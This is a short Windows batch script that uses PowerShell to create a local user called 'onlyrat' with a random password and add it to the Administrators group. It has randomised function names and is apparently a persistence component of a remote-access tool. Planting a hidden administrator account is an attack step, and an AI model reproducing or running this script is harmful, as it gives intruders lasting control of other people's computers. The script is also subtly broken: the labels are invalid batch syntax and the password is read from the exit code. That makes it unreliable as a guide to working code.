@echo off

REM Define function to generate random password
:function RpLGWiUsIy
powershell -Command "$password = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_}); Write-Output $password"

REM Define function to create local admin user
:function geIwCZloBx
powershell -Command "param ($username, $password); New-LocalUser -Name $username -Password (ConvertTo-SecureString $password -AsPlainText -Force) -FullName $username -Description 'Temporary local admin'; Add-LocalGroupMember -Group 'Administrators' -Member $username"

REM Call functions to create admin user
call :RpLGWiUsIy
set "password=%errorlevel%"
call :geIwCZloBx onlyrat "%password%"

REM Delete functions
goto :eof
